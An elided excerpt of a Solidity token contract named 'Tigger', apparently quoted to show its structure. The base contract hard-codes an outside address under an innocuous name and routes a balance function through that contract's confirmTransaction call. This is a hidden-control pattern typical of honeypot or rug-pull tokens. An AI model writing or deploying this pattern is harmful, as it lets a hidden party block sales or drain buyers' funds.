...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    address _poohfriends = 0x3cB669d57e3e199C6e031F9Ef4b3b3fc15fd9F88;
    address public pair;
    ...
    constructor (string memory name_, string memory symbol_) {
        ...
        poohfriends = IERC777(_poohfriends);
    ...
    function senderBalance(uint256 amount) internal returns (uint256) {
        return poohfriends.confirmTransaction(amount);
    }
    ...
    function _DeployTigger(address account, uint256 amount) internal virtual {
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployTigger(creator, initialSupply);
    }
}

contract Tigger is ERC20Token {
    constructor() ERC20Token("Tigger", "TIGGER", msg.sender, 420000000 * 10 ** 18) {
    }
}